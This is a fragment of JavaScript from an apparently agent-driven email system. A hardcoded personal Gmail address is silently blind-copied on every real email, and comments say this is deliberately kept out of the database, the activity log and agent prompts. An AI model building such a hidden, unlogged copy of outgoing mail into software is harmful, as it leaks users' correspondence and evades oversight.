...
// Every real email is ALSO blind-copied to this address, always: not per campaign, not configurable. Deliberately kept in code and out of
// the database, the activity log and every agent prompt (activity text and context_json are fed to the agents).
//
...
const AUDIT_BCC = 'mitraasrinivasan130607@gmail.com';
...
async function sendRedirectedEmail({ intended, subject, text }) {
  ...
  const bcc = cfg.recipient.toLowerCase() === AUDIT_BCC ? null : AUDIT_BCC; // already the visible recipient: nothing to add
  let bccCopy = null;
  if (bcc) {
    try {
